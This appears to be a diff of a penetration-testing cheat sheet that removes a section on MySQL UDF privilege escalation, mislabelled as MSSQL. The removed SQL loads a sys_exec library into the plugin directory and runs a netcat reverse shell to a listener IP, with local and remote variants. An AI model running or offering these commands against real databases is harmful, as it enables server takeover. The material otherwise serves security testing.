@@ -192,31 +192,6 @@ CHPWD 101 code=00a01000 msg="Begin" format="section" \[Result\] UpdatePasswd=0
 https://XXXX/dana-na/setup/psalinstall.cgi
 ```
 
-## MSSQL Privilege escalation
-
-Privilege escalation for mysql running as root with mysql root account
-
-[mysqludf_msf](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql)
-
-```bash
-# Find plugin directory
-SHOW VARIABLES LIKE 'plugin_dir';
-select @@plugin_dir;
-
-# Local method
-use mysql;
-create table tranilment(line blob);
-insert into tranilment values(load_file('/tmp/lib_mysqludf_sys_64.so'));
-select * from tranilment into dumpfile '/<plugin_dir>/lib_mysqludf_sys_64.so';
-create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
-select sys_exec('nc <listener_ip> 1234 -e /bin/bash');
-
-# Remote method
-select "///<listener_ip>/SAHRENAME/lib_mysqludf_sys_64.so" into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys_64.so';
-create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
-select sys_exec('nc <listener_ip> 1234 -e /bin/bash');
-```
-
 ## **SSL / TLS**
 
 * [testssh.sh](https://github.com/drwetter/testssl.sh)
